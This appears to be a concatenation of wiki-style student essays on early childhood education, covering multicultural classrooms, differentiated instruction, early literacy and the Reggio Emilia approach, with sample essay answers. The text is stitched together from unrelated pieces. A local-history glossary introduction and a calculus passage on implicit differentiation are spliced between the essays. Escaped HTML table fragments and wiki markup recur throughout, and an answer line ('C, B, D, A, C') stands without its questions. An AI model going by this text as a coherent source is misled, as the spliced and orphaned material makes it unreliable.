classrooms.  Students enter school with little knowledge of the 

dominant culture.  They may also be ESL (English as a second 

language) students.  Students from diverse backgrounds may face 

academic difficulties, or socialization difficulties with 

classmates.  However, the careful guidance of well trained teachers 

will assist students in making a smooth transition.  Teachers who 

incorporate many cultural experiences and activities teach cultural 

awareness, tolerance, and to appreciate cultural and linguistic 

differences (Hepburn, 2007). Young children who are placed in an 

environment that fosters cultural diversity will gain positive 

attitudes and experiences.  Early exposure to diversity within the 

classroom will have long-term affects in subsequent school years.  

It will prevent racial, cultural, or religious divisions and 

tensions that typically arise when students are fearful, ignorant, 

and prejudiced against classmates who are different. 
     
Howard (2002) suggests that, the following guidelines will 

support teachers attempting to provide students with multicultural 

education. 
----------------------------------------------------------------    
1.  What are our own prejudices, beliefs, and values?  To what extent do we make assumptions?
--------------------------------------------------------------------
2.  We should work at being accepted and trusted by students and their parents, to avoid negative feelings of suspicion and distrust that can quickly shut off communication.
--------------------------------------------------------------------
3.  Ask for parental and community assistance that is meaningful.  For example, ask persons who may have experienced the Civil Rights Movement to share their experiences.  Or, ask a parent to share their culture with students.
--------------------------------------------------------------------
4.  We must remember that textbooks do not routinely portray minorities in non-stereotypical ways.  We need to seek out and incorporate materials that respects minority perspectives in ways that are not merely singling out minorities as either heroes or victims of discrimination.
------------------------------------------------------------------- 
5.  We should engage our students in culturally relevant activities and assignments.
--------------------------------------------------------------------
6.  We must take a stand against intolerance when it appears in speech or actions of students, faculty, or staff at our schools.  Policies must be written to enforce the stand.
We must prevent cliques from forming and the shunning of other students.  When other students lack empathy for others, we need to encourage them to think, discuss, read, and write about how their actions affect the lives of others.                                                           
--------------------------------------------------------------------
7.  We need to provide direct instruction in cultural diversity for students, teachers, and staff and to be role models ourselves.  We should make a conscious effort to join in culturally mixed groups.  We should invite parents, community members, and staff to join us to provide programs for our students (p. 347).
--------------------------------------------------------------------

==Understanding Linguistic Diversity==

Today, America is experiencing an influx of immigration.  

For example, California has one of the most linguistically diverse 

segments in the nation.  There are over one hundred languages 

spoken by children in the state of California.  Over 1.5 million 

are enrolled in Limited English Proficient students (LEP).  Most 

language-minority students are classified as at-risk, because they 

face challenges in reading, writing, and passing state testing.  

Public schools do offer LEP students’ primary language instruction, 

bilingual tutoring services, bilingual instructional assistance, 

and academic instruction. However, in the past strategies such as 

teaching whole language approach to learning has not been effective 

(Vang, 2005).  It takes about one to two years to develop 

conversational competencies, and five to seven years for successful 

cognitive demands in a school setting.  She recommends that 

teachers should activate prior knowledge, use thematic units, 

increase wait time for anticipating responses, and provide breaks.  

Also, teachers should repeat phrases, simplify language, pair 

native speakers together when grouping students, build vocabulary 

using cards with pictures, and most importantly teachers must be 

culturally respectful of LEP students (Watson, 2007).

==Cultural Sensitivity==  

Teachers have the responsibility to provide all students with 

the opportunity to achieve to their fullest potential.  Richard, 

Brown, Forde (2007) stated, “If instruction reflects the cultural 

and linguistic practices and values of only one group of students,

then the other students are denied an equal opportunity to learn.” 

(p 68).  Cultural insensitivity suppresses cultural exchanges and 

interactions. The teacher must enrich the curriculum with 

multicultural materials that are a reflection of the students. It 

is important for teachers to demonstrate cultural and linguistic 

sensitivity.  Inclusion rather than exclusion promotes increased 

self-esteem, academic achievement, and a learning environment that 

accepts cultural differences.


==Integrating a multicultural Curriculum==

In the classroom, teachers should make connections with 

students’ cultural identities by providing instructional materials, 

literature, and textbooks that reflect their culture.  

Bulletin boards, classroom activities and newsletters should be 

culturally supportive of students (Richards, Brown, Forde, 2007).  

In the past, textbooks were written to reflect the European-

American perspective.  Minorities were usually represented as the 

conquered people, which alludes to the ideology that Western 

culture is superior.  References to African-Americans focus 

primarily on slavery, or discriminatory issues.  For example, 

Anthony Johnson was an indentured servant living on the Eastern 

Shore during the 1640’s.  He became a successful landowner with 

servants.  It is important to show other cultural perspectives.

The European-American world-view historically describes the 

discovery of America as though it was an uninhabited region.  

However, America was already thriving with inhabitants which are 

known as Native Americans.  They had a rich culture, of languages, 

art, advanced skills including hunting, tracking, and farming.  

However, they were often written in history books as conquered 

people at best, or savages at worst.  To successfully recognize 

students from multicultural backgrounds, teachers should not 

present a curriculum from only a negative perspective.  They need 

to include cultures in the curriculum in a positive and meaningful 

manner.  

Richards, Brown, Forde (2007) assert that, “teachers can 

capitalize on the strengths students bring to school. The more 

students experience familiar practices in instruction and are 

allowed to think differently, the greater the feeling of inclusion 

and the higher the probability of success.” (p 66).

==Final thoughts==

Today, a multicultural education is necessary because 

American public schools are culturally diverse.  When teachers 

accept diversity, and promote cultural sensitivity within their 

classrooms they foster a community of learners.  Differences 

between races, ethnic backgrounds, languages, and genders will be 

accepted and respected.  There will not be a need for divisions 

among students because the community will feel safe, respected, 

supported, and understood in their learning environment.  Early 

childhood classrooms should be enriched with multicultural 

materials that are a reflection of the students.  Such an enriching 

environment sets the stage for cultural acceptance, and 

sensitivity.  It will be the guiding light of the teacher to afford 

students the opportunity to reach their highest levels within the 

frame work of a multicultural education.  When children learn in a 

multicultural environment the positive affects are life-long; and 

their future potential is limitless.

==ESSAY QUESTION==

How could teachers promote a culturally sensitive classroom 

environment?

First, I would suggest that teachers accept the differences 

among students within the classroom.  Each child enters the 

classroom with prior knowledge and cultural 

differences.  The teacher should not criticize the differences, but 

listen, learn, and respect the student’s cultural framework.  This 

cultural exchange could be one-on-one or part of a classroom 

meeting in which the students could share their home life 

experiences.  It is imperative that the teacher model cultural 

tolerance, because the children learn from her verbal and non-

verbal responses.  If the teacher shows interest by asking further 

questions, nodding, or smiling the student will feel accepted and 

the other students will learn cultural sensitivity.

Often, teachers believe that covering a social studies topic 

on a minority includes multicultural education.  However, there are 

many other ways to integrate cultural sensitivity within the 

classroom.  For example, instead of reading a book whose story 

characters are the dominant culture, search for books that offer 

diversity.  Then, discuss the book’s characters, and the cultural 

similarities.  Multiculturalism isn’t always about expressing the 

differences, often there are many similarities that are unknown by 

students.  When children learn about the similarities, they begin 

to make connections and understand that although there are obvious 

differences between them, there are also many 

similarities.  Students could make a collage with cutout pictures 

representing a culture.  They could share their collage with the 

class, which would demonstrate what they learned while exploring 

another culture.

“Differentiation is not a methodology or series of steps; it is a philosophy that one accepts.”  -Carol Ann Tomlinson

&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;


What is differentiation?  Curriculum differentiation is a broad term referring to the need to tailor teaching environments and practices to create appropriately different learning experiences for different students (Farmer, 1996).  Differentiation occurs in diverse classrooms.  The students are given ability-appropriate assignments and are often able to select assignments that appeal to them.  By being able to have some choice in assignments, those students will be able to work with their learning strengths and interests.  In this best-of-all-worlds “differentiated” scenario, lower-ability students stand to benefit from learning sparks thrown off by higher-level students (Fischer, 2004).  In most classrooms there are students who struggle with learning, others who perform beyond expectation, and the rest in between.  This diversity raises the need of differentiation in instruction.  If teachers what to have maximum potential in individual students, then they will have to address different needs.  


Another benefit of differentiation includes the reduction of inequality in the classroom.  The rationale of the arguments in favor of a differentiated curriculum as a strategy of reducing educational inequalities is straightforward: Students do better when they can study subjects and levels within subjects that match their abilities and inclinations (Ayalon, 2006).  With this in mind, underprivileged students can also have the chance to benefit from instruction.  Yet despite the reasons behind differentiation, some teachers hesitate to apply it to their own classroom.  Feeling it is time consuming and that they lack resources and support, teachers forgo this process without debate.  However, if the teachers are properly informed about what they can do and the effects, perhaps they will embrace this philosophy.  According to the differentiation philosophy, teachers could organize assignments.  Some tasks may need groups based on interest, learning style, or student readiness; meaning the level of their skills such as reading and writing.
	

The topic of differentiation of instruction has many different opinions concerning organization.  It seems that the main elements of differentiation include content, process, products, and the learning environment.  


Content modification uses the student’s abilities to build a richer knowledge base.  This element of differentiation encourages abstractness, complexity, variety, the study of people, and the study of methods of inquiry.  Examples of differentiating content at the elementary level include the following: using reading materials at varying readability levels; putting text materials on tape; using spelling or vocabulary lists at readiness levels of students; presenting ideas through both auditory and visual means; using reading buddies; and meeting with small groups to re-teach an idea or skill for struggling learners, or to extend the thinking or skills of advanced learners (Tomlinson, 2004).


Process modification promotes creativity and higher level cognitive skills.  This is developed through encouraging higher levels of thinking, creative thinking, open-endedness, group interaction, variable pacing, a variety of learning processes, debriefing, and freedom of choice.  Examples of differentiating process or activities at the elementary level include the following: using tiered activities through which all learners work with the same important understandings and skills, but proceed with different levels of support, challenge, or complexity; providing interest centers that encourage students to explore subsets of the class topic of particular interest to them; developing personal agendas (task lists written by the teacher and containing both in-common work for the whole class and work that addresses individual needs of learners) to be completed either during specified agenda time or as students complete other work early; offering manipulative's or other hands-on supports for students who need them; and varying the length of time a student may take to complete a task in order to provide additional support for a struggling learner or to encourage an advanced learner to pursue a topic in greater depth (Tomlinson, 2004).


The next element involves product modification.  The aim here is to facilitate opportunities for talented students to produce a product that reflects their potential (Farmer, 1996).  This can be accomplished through creating real problems, real audiences, real deadlines, transformations—original manipulation and not an exact copy, and appropriate evaluation.  Differentiation of products can involve giving the students the option of how they will express information; using rubrics for varied skill levels; giving students opportunities to work alone or in groups; and encouraging individual product assignments while containing the required elements.


The last element of differentiation is the learning environment.  The goal here is to create a safe, flexible environment where students are able to take risks and build knowledge and abilities to the maximum extent available.  This environment is student-centered, fosters independence, is open and accepting, complex, and highly mobile.  Examples of differentiating learning environment at the elementary level include: making sure there are places in the room to work quietly and without distraction, as well as places that invite student collaboration; providing materials that reflect a variety of cultures and home settings; setting out clear guidelines for independent work that matches individual needs; developing routines that allow students to get help when teachers are busy with other students and cannot help them immediately; and helping students understand that some learners need to move around to learn, while others do better sitting quietly (Tomlinson, 2004).


If we want to maximize the student’s potential, differentiating instruction is a practical and effective way of doing so.  Teachers cannot just make one or two different lessons and find this as differentiation.  To do this successfully, they should follow the different elements suggested, along with other practices.  The first tasks teachers need to ensure are clear learning objectives to determine curriculum decisions.  Another step would be scaffolding.  Scaffolds are temporary supports that help a learner bridge the gap between what he or she can do and what he or she needs to do to succeed at a learning task (Carolan, Guinn, 2007).  Along with these supports, to make differentiation successful, teachers should also make lessons interesting and relevant to students and keep the learning active. 


Beginning to use differentiated instruction may seem overwhelming to teachers.  However, there are a few suggestions that can help a teacher to begin differentiating or differentiating more effectively in a classroom where it is already used.  One suggestion is to prepare students and parents for the new structure in the classroom.  Another suggestion would be to teach routines and review the effectiveness of these routines.  Having the students in tune with the teacher and the new structure of the classroom will help differentiating instruction begin smoothly.  Teachers should also talk to other educators and administration to build a support system.  Planning and sharing ideas can help promote a successful classroom.  Differentiating instruction can help students benefit from an education.  However, teachers need to make sure they are actually differentiating the instruction and doing so efficiently.  With the proper tools in place, students can enjoy and take something away from lessons.

Answers:  C, B, D, A, C

==Essay Question== 
	
	What are the four elements of differentiated instruction?  Give examples of each.

Sample Essay Response:  The four elements of differentiated instruction include modifying content, process, products, and learning environment.  Content modification includes activities that will assist with the material being presented.  This includes reading buddies, text materials on tape, presenting ideas in auditory as well as visual means, and using reading material at varying levels.  Process modification uses personal agendas, provides interest centers, and offers manipulative’s or other supports for the students who need them.  Product modification gives students the choice of how they want to express learning, encourages students to create their own products, and has teachers use rubrics according to varied skill levels.  Finally, the learning environment creates areas for both independent and collaborative work.  Independent sections are available without distractions and collaborative areas are allowed for group discussions.  The learning environment also allows students to move around when needed and routines are created.  Teachers can use these elements to guide them to creating a structured, as well as flexible, environment for a variety of learners.

This is a Resource Book of '''Local History''' '''techniques''' and '''terminology''' aimed at helping local history researchers who are studying historical documents which contain many archaic terms, local names for plants and animals, dialect words (Scots, English, Welsh, Cornish, American, etc.), unusual first names, specialist farming terms, legal terms, obscure or rarely used (archaic) words, etc. which are often absent from standard factual sources or are only defined briefly, in outline and often not in context.

This [[/Abecedary|abecedary]] is designed to be used as a resource for all local history linked researches and as a steadily accumulating bank of information on each topic. Editors are invited to add new words, but to do more than just give definitions, e.g. cite examples, sites for, historical links, trivia, etc.

=='''What is literacy?'''==
According to Peter Macinnis literacy is more than just books; it means a love of the language (Macinnis).  Literacy is the ability to read and write.  Reading and writing evolve from our language skills.  Language is important because without it we would not be able to read.  

Reading is very much a language activity and with it we have the ability to read.  Our ability to read is limited by our language skills (Gunning p. 2).  We need to understand our language to understand what we are reading.  “Even if we can pronounce words we don’t understand because of superior phonics skills, we are not reading (Gunning p.2).”

 
=='''Why should we promote early literacy?'''==
Promoting literacy now can prevent reading difficulty which contributes to school failure.  School failure leads to increase risk of absenteeism, drop-outs, juvenile delinquency, substance abuse and teenage pregnancy.  All of these risks continue the cycle of poverty and dependency (ROR).  Families that live in poverty lack the money to buy new books and access libraries.  This cycle needs to be stopped and we can help stop it by promoting early literacy.
Literacy needs to be promoted at an early age.  Promoting literacy at an early prepares children for kindergarten. A child who is limited to their exposure in reading and writing may have very different expectations and understandings than those who have had exposure (Literacy Guide).  Research shows that literacy improves children’s ability to articulate their selves verbally, it increases children’s listening vocabulary and it reduces that number of children with language delays that can prevent them from succeeding in school (ROR).  Early literacy not only has a great effect on children but also the parents involved.  Early literacy can change the attitudes of parents about reading out loud to children.  When a parent reads to their child and they see that it is promoting their language skills, then they are likely to continue to read out loud to their child and more likely to try new and exciting activities.  It can make reading a fun activity for children and parents.  Reading can promote a routine bedtime story for the children and increase access to books (ROR).   Reading to your child increases their vocabulary, making them more likely to learn to read on a schedule.  Promoting literacy early helps the child to achieve goals that are accustomed to all.  First, children want to become fluent and efficient readers and writers.  To do this they need to be able to make sense of and transmit the meaning of our written language.  Second, children want to become thinkers and communicators.  With this they will become active reviewers and analyzers of information.  Third, children will come to enjoy reading and writing.  Lastly, children want to feel a sense of accomplishment, they want to feel successful users of literacy (Literacy Guide).

&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
=='''How can we promote early literacy?'''==
	All parents want their child to succeed in life and become a well-rounded person and student.  They want their child to excel in school and will do all that they know to do to help their child achieve this.  Parents do not always know what they need to do to help strengthen their child’s abilities and oftentimes they do not have the resources to do this.  To strengthen and promote a child’s literacy skills is very important.  To help promote a young child’s enjoyment in talking, listening, reading and writing adults can provide an assortment of appealing language experiences (Child Care).  The most important thing is to be a model of literate behavior.  This can be done by writing notes, keeping calendars or daily planners, post grocery lists and needed household items, children’s responsibilities, introduce new vocabulary words through conversation and book reading and subscribe to the local newspaper or magazines (Child Care).  Reading out loud to your children is also another way you can promote literacy.  To do this you can follow the Reach Out and Read model.  This model encourages pediatric literacy.  At every check-up the doctors and nurses encourage the parents to read to their child.  They also provide age-appropriate tips and encouragement.  The Reach Out and Read model encourages parents who may have difficulty reading to invent their own stories to go with picture books.  They can also spend more time naming objects with their child (ROR).  Another key is resources.  Some parents are not able to provide their child with resources, books, for their child.  Providers for the Reach Out and Read model give every child between the ages of six months and five years a new, developmentally appropriate book to keep (ROR).  There are many public libraries in every area.  Take your child to the library and check out books or sit there and read to them.  Not every family is able to participate in the Reach Out and Read model but they can follow some of their guidelines.  

	Spend time writing with your child.  Forget about grammar and spelling and just let them write.  If you are writing, put a pencil in their hand and allow them to write with you.  If they just scribble something on a piece of paper, ask them what it is and write it for them.  Encouragement is imperative at such a young age.  Provide children with tools for literate practice.  Tools may include materials such as paper, pencils, markers, pens, envelopes, magazines, newspapers and anything in that category (Child Care).  This should be fun and exciting for the children and you so sing songs and make up silly rhymes, play with words and sounds and do this everyday.

'''Essay Question'''
After reading this article you have a better understand of why promoting literacy early is important.  Some families that live in poverty do not have access to some resources.  Briefly discuss why early literacy is important and then discuss what these families can do to promote early literacy to possibly break the continued cycle?


	Promoting literacy at a young age is important to prepare the child for their school years.  If a child is well prepared and has a high vocabulary it will decrease their chances of having reading difficulties.  When a child struggles in school they are most likely to stop going, drop-out.  Children that do not attend school often get bored and find other ways to occupy their time.  Activities many include criminal acts, the use of drugs or alcohol and sex.  These children are usually from a family that is poverty and unfortunately this cycle will only continue for them and later generations to come.  The cycle often continues because these children were not read to at a young age.  Since they were not read to they do not find it of importance to read to their children or do not have access to resources or can not read their self.  Families that are in poverty can break this cycle.  They can promote literacy by talking to their children.  Hold conversations with them all the time.  Ask them questions, point to things and explain to them what it is.  You can sing songs and make up rhymes with them. If you are able to get to a local library, sit in there and read to your child.  Although you may not have access to all the resources in the world, you do not need them all to promote literacy.  If you use what you have in the right ways then you will be successful in helping build your child’s vocabulary.

by Mei-Yi Chen


== A Nation of 300 Million ==


The population of the United States is changing and will continue to change. Having more than 300 million people, America is a nation of blended races. In addition, the country has added 100 million people since 1967 and about 53% of them are recent immigrants or their descendants, according to Jeffrey Passel, demographer at the Pew Hispanic Center. “The newcomers have transferred an overwhelmingly white population of largely European descent into a multicultural society that reflects every continent on the globe.”(Nasser, 2006). All these statistics have magnificent implications for increased multiculturalism.

== Multiculturalism ==

According to Wikipedia, “multiculturalism is an ideology advocating that society should consist of, or at least allow and include, distinct cultural groups, with equal status. Multiculturalism is a term often used to describe the cultural and ethnic diversity of a nation and recognizes that this rich diversity is a positive force in furthering society’s nationhood or cultural identity(2007).” 

The seven stages of moving toward multiculturalism, according to Jaime Wurzel, are (1) Monoculturalism, (2) Cross-Cultural contact, (3) Cultural conflict, (4) Educational interventions, (5) Disequilibrium, (6) Awareness, (7) Multiculturalism.

== Bridging The Worlds ==

Young children who live in a multicultural community experience cultural diversity firsthand; it is part of their world. On the other hand, other children who live in a monocultural community often have difficulties understanding and accepting an environment that is different from theirs. Knowing more about the significance and nature of children's’ journeys between home and school and the influences of those journeys, educators can help their children bring together the worlds of home and school and all other worlds that they may experience in their daily lives. Early childhood educators can create multicultural classrooms which can provide children a common ground and help them to connect all worlds together.

== In The Early Childhood Classroom ==

Classrooms around the United States are becoming more and more culturally diverse. Early childhood educators need to understand that teaching their new students successfully means learning about new cultures. Moreover, how educators respond to the multicultural makeup and needs of children will determine how well the children fulfill their responsibilities in the years to come.

== Goals ==
   
In early childhood classrooms, educators should transmit multiculturalism to children and the following goals need to be accomplished:

1.	Recognize the beauty, value, and contribution of each child.

2.	Teach children to respect others’ cultures as well as their own.

3.	Talk to children about racism and current events regularly.

4.	Assist children in functioning successfully in a multicultural society.

5.	Increase children’s opportunities to talk and play with diverse people.

6.	Encourage children to experience in positive ways both their differences as culturally diverse people and their similarities as human beings.

7.	Help children notice and do something about unfair behavior and events.

8.	Help children who are affected by racism develop a positive self-esteem.

== Requirements for Early Childhood Educators ==

By understanding diversity and respecting individuality, educators can better serve culturally diverse students. Moreover, early childhood educators should possess three elements.

1.	Personal commitment

There is no short cut or panacea to accomplish educational equality for America’s culturally diverse populations. In addition, working with children and their families with diverse cultures is challenging and can be difficult. In order to make significant progress, educators need to have sincere and wholehearted commitment. Such commitment can be tough but is necessary for educators in dealing with a variety of issues in the multicultural classrooms and in meeting the challenge of diverse groups of children.

2.	Knowledge of what makes a difference

“Recent research has redefined the nature of our culturally diverse students’ educational vulnerability. It has destroyed both stereotypes and myths and laid a foundation upon which to reconceptualize present educational practices and launch new initiatives. This foundation recognizes the homogeneity/heterogeneity within and between such populations.”(Garcia, 1995). The study findings for early childhood contribute important knowledge to general instructional organization, literacy development, academic achievement in content areas and the perspectives of children, parents, and educators. Therefore, educators should recognize that academic development has its roots in sharing knowledge and experiences through communication. Within the knowledge-driven curriculum, skills are tools for acquiring knowledge, not an essential goal of teaching events. 

3.	Educational leadership

Educators need to move beyond national educational goals. Educational leadership is needed to spread new knowledge, to apply new knowledge to skill development, and to engage in childhood development.

== Practices ==

                         Children learn by observing the differences
                         and similarities among people and by absorbing
                         the spoken and unspoken messages about those 
                         differences.
“Numerous research studies about the early process of identity and attitude development conclude that children learn by observing the differences and similarities among people and by absorbing the spoken and unspoken messages about those differences.”(Hepburn, 2007). In order to teach children to respect and value diversity, educators should include the following elements in the early childhood programs:

•	Raising cultural awareness

Educators need to acknowledge that frequently developing their own multicultural awareness, attitudes toward children and their families, and knowledge and skills is necessary and significant. By doing that, appropriate instructional materials like multicultural literature should be provided in the class. In addition, an antibias and multicultural curriculum and activities need to be carefully designed and implemented in the program. An antibias curriculum can help children to learn about their own identity and to respect different gender, ethnicity, races, backgrounds among people.

•	Teaching to children’s various learning styles

Every child learns in different ways. To be able to meet children’s physical, emotional, social, and academic needs, educators need to know each child’s unique learning style.

•	Welcoming parent and community involvement

Educators should provide parents and the community frequent opportunities to be involved in school activities. Some recommendations are using a personal touch and nonjudgemental communication, expressing resolve in maintaining involvement, providing strong leadership and administrative support, and managing community outreach. 
 
•	Supporting and valuing every child 

The concepts of valuing the individual and respect for human diversity have evolved slowly over the ages. Every child needs to be treated as an individual and children need to learn their own identity and background.

== Conclusion ==

Early childhood educators still have a long way to go to make sure that all classrooms and curricula fulfill children’s needs of multiculturalism. They can be at the forefront of making great progress by educating both themselves and young children for living in a diverse society.

'''What are some trends that will encourage educators to transmit multiculturalism in the early childhood curriculum, programs, and practices?'''


Though some educators and parents have opposed multicultural teaching in the past, the public is recognizing more and more that effective multicultural education is good for all. A wealth of materials have become available to assist early childhood educators in teaching multiculturalism. Because not all materials are of equal value or worth, educators will have to be more discerning when choosing materials appropriate for their children. More early childhood educators are realizing that children as young as preschoolers can learn about multiculturalism, and multicultural activities and content are being included in curricula. Moreover, multicultural curricula are becoming more pluralistic and include knowledge and information about numerous cultures. Consequently, more children will be exposed to and examine a full range of cultures rather than only two or three. “Many early childhood educators are being challenged to preserve children’s natural reactions to others’ differences before they adopt or are taught adult stereotypical reactions. Young children are, in general, understanding and accepting of differences in others.”(Morrison, 2004, pg.458)

      <text xml:space="preserve">=='''Differentiated Learning'''==
'''By Ashley Deutsch'''


	There are many different ways of teaching students what they need to learn.  However they can all be grouped into two categories.  Teachers can take the average of the class, which could go above some of the students heads and it could also make it too easy for other students.  The other way of teaching is to teach differentially, to the diverse needs of all the different students.  Catering to the diverse needs of all the students in a class is called differentiation.

	Differentiation is defined as adjusting the curriculum, teaching strategies, and environment to meet the diverse needs of all the students (Batts &amp; Lewis, 2005).  By doing this teachers can maximize the potential of each student in the classroom (Carolan &amp; Guinn, 2007).  Differentiation is a practice that is derived from certain values; the way people teach their students, develop their curriculum, establish rules, and talk about learning (Benjamin, 2006).  Compared to teaching the class as a whole it could seem like a lot of extra work, but when the teachers and schools are looking for better performance, a little extra work is not that much.

	The first step in teaching students in a differentiated manner is to teach the teachers how to teach differentially.  Teachers need to understand the theory as well as the related practices and developmental skills.  The instructors teaching the teachers how to teach differentially need to clearly explain how and why differentiation should be used.  Since each school district is different the instructors need to be able to tell the teachers what the stand is of the district they teach in.  Mostly though, instructors need to realize that everyone they are teaching are also at different levels just like the students.  They need to teach through modeling, show how to develop understandings and practices related to the different learners needs and also be patient because not everyone is going to understand what is being taught right away (Hedrick, 2005).

border: solid 1px #FFBDBD; padding: 1em;&quot; valign=top&gt;

'''D'''- Determine the standards to be taught

'''I'''- Identify the students needs with strong assessment tools before, during, and after the learning

'''F'''- Formulate plans that link the targeted standards with individual needs

'''F'''- Find effective strategies and activities to teach the information
'''E'''- Engage students in activities that employ their interests and the ways they learn

'''R'''- Relate learning to the students’ worlds

'''E'''- Encourage risk taking with wise choices

'''N'''- Nurture the social and emotional aspects of the students

'''T'''- Target the learners’ needs with flexible grouping designs

'''I'''- Ignite each student’s desire to learn

'''A'''- Adjust assignments to match the learner’s abilities, knowledge levels, and interests

'''T'''- Tailor lessons with student-focused activities

'''E'''- Entice and ignite lifelong learners

(Chapman &amp; King, 2005)
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

	Carolyn Chapman and Rita King give eleven helpful tips to guide teachers towards differentiation.  First they say, know the standards.  The standard is the topic that the teacher is trying to get across, once he/she knows the topic he/she can customize the learning opportunities for the different learners.  Secondly, they say to vary the instructional strategies and activities.  By changing the activities it keeps the students interested in the topic, and able to create relevant personnel connections to each lesson.  Third, they said to create a learning climate.  This is a safe, inviting environment that makes the students feel special, and encourages them to take risks and celebrate success.  The fourth step is to exhibit “withitness.”  Withitness is the teacher’s attitude about what he/she is doing.  Teachers who are “withit” are the ones who show that they care, make the students feel important, and are the teachers who the students will remember for the rest of their lives.  Their fifth suggestion is to provide a wide variety of materials and resources.  These are important to help each student at his/her different ability level, the materials are what provide the successful experiences for the learners.    Sixth is to know the students.  When teachers know their students they are better able to help them, and match the appropriate materials and strategies to each students needs.  Seventh they say to assess before, during and after the learning.  By doing assessments before the lesson teachers learn what the student already knows about the topic.  If the students are not performing as well as they could be it is the educators’ job to revise the way they are teaching to that student.  Post assessments are used to see if the student captured the understanding of the lesson and will be able to generalize the information learned, use the information outside of the classroom setting. The eighth step is to adjust the assignments.  Because different students may be at different levels, the teacher needs to realize that for the learners interested in the topic the lessons may be boring because they already know the basic information.  Then there are the students who are capable of understanding what is being taught, as well as the students who may not be quite as ready as the rest of the class to move on to the new lesson.  Assignments need to be catered to the individual student’s needs.  Ninth is to plan student-focused opportunities.  Give the students choices of how they want to learn, different areas can be set up throughout the classroom to fit the diverse learning needs.  Step number ten is to use flexible grouping designs.  Students need to learn how to work individually as well as in group settings, by using TAPS (T= Total groups, A= Alone, P= Partners, and S= Small groups) the students get to try out the different grouping techniques.  Finally, step eleven says know that change is gradual.  Not everyone will catch on to the new teaching style at once, but when the teachers realize the potential it has for their students they will be more inclined to participate (2005).

	Another article states that the best way to understand differentiation is to actually go and observe classrooms that use it, and that is exactly what Jennifer Carolan and Abigail Guinn did.  They sat in on five classes that effectively used differentiation and noticed four characteristics that each of them had.  Each one of the five classrooms offered personalized scaffolding, a technique that helps students create a bridge between what they can do and what they are trying to do. The classrooms used flexible means to reach defined ends, which are the clear learning goals the teacher had for the students, as well as the different paths the learner could use to reach those goals.  The teachers had mining subject-area expertise, which knows the student as well as the subject area and knowing what they might already know and how they come to the conclusions they come to.  And finally they created a caring classroom in which differences were seen as assets, instead of seeing differences in the students as obstacles the differences were turned into positive attributes (2007).

	The reason most teachers do not use differentiated instruction is because they think they will have to teach each lesson three different ways.  That is not differentiation, nor is it practical in any sense (Carolan &amp; Guinn, 2007).  However, once differentiated learning is implemented in the classroom teachers need to value what they are doing.  Parents will have questions and it is the teachers’ responsibility to inform them that their child’s performance will not decline, but should improve (Benjamin, 2006).  “While teachers do and should use whole-group instruction, teaching to the whole group without using and other instructional method will not address the needs of all the learners.  And ‘Even though it takes a lot of time up front to plan for a differentiated classroom, the benefits have been proven.(Batts &amp; Lewis, 2005)’”

=='''Essay Question'''==

'''In 200-300 words explain what you think differentiation is, and if you would use in it your classroom.'''

	Differentiation is a teaching style that focuses on the diverse needs of all the students in the class.  It is a very welcoming type of teaching where students get to learn in ways that will benefit them the best.  The learners are taught that experimenting for the right answer is not bad as long as they have reasons as to why they are doing something, and when they are correct their success is celebrated.  In this kind of teaching the teachers need to get to know each and every student more so than if they were teaching the class as if everyone was on the same level.  By getting to know the students it makes the teacher seem more personable and not only will the child feel more comfortable with him or her but the teacher will also be able to help the student have better academic success.

	I would use differentiated teaching in my classroom.  Teachers become teachers so they can help the future generations of children succeed in life, going into the job they know that not everyone is the same, nor do they come into school at the same level or learn at the same pace.  I believe it is very important to teach to each child’s needs and I plan on doing whatever I can to help the children succeed, even if that does mean a little extra planning on my part.

      <text xml:space="preserve">== Implicit differentiation ==
Implicit differentiation is a method of differentiating an expression in &lt;math&gt;x&lt;/math&gt; and &lt;math&gt;y&lt;/math&gt;, where &lt;math&gt;x&lt;/math&gt; and &lt;math&gt;y&lt;/math&gt; are related in some manner and neither are constant.

For example, one could differentiate &lt;math&gt;f(x) = y^2&lt;/math&gt; with respect to &lt;math&gt;x&lt;/math&gt; as follows:
:Using the chain rule:
::&lt;math&gt;\begin{align}
\tfrac{df}{dx} &amp; = \tfrac{df}{dy} \times \tfrac{dy}{dx} \\
               &amp; = 2y \times \tfrac{dy}{dx}
\end{align}&lt;/math&gt;

It is useful to think of implicit differentiation as normal differentiation with respect to &lt;math&gt;x&lt;/math&gt;, only whenever you come across a term with &lt;math&gt;y&lt;/math&gt;, you multiply the differentiated term by &lt;math&gt;dy/dx&lt;/math&gt;.

Another example: find the derivative &lt;math&gt;dy/dx&lt;/math&gt; of &lt;math&gt;x^2+y^2=r^2&lt;/math&gt;

Working:
:&lt;math&gt;\begin{align}
2x+2y.\frac{dy}{dx} &amp; = 0 \\
2x                   &amp; = -2y.\frac{dy}{dx} \\
\frac{dy}{dx}       &amp; = -\frac{x}{y}
\end{align}&lt;/math&gt;

      <text xml:space="preserve">==The Reggio Emilia Approach==

'''By J.T. Lambert'''



=='''Brief History and Philosophy'''==

Reggio Emilia is a city in the affluent wine country of Northern Italy. After World War II, educators, parents and children of the city came together with the purpose of offering hope to society and improving life for children and families (Edwards, 2003). The women of Reggio Emilia established the Dianna School and in 1946, Loris Malaguzzi, a local teacher, dedicated himself to this task and remained the director of the school until 1985 (Finegan, 2001). In 1963, Malaguzzi persuaded the city government to assume responsibility for running this school as well as the other schools in the district.  Teachers worked to develop new ways of teaching that would support a democratic society by combining the concept of social service with education. A series of national laws passed between 1968 and 1971 made possible the development of the comprehensive program or Reggio Approach as it is known today as a world renowned educational technique (Morrison, 2000). The goal of the Reggio Emilia schools is  to serve as a resource for educators, parents, and the community to engage in “collaboration, communication, and participation” to respond to the right of all children to receive a quality education according to their individual learning abilities and specific interests (Finegan, 2001). 
     

&lt;table WIDTH=&quot;60%&quot; ALIGN=&quot;right&quot;&gt;&lt;tr&gt;&lt;td style=&quot;background-color: #FFF7F7;
border: solid 1px #FFBDBD; padding: 1em;&quot; valign=top&gt; 

“A school needs to be a place for all children, not based on the idea
that they are the same, but that they’re all  different”  - Loris Malaguzzi

&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

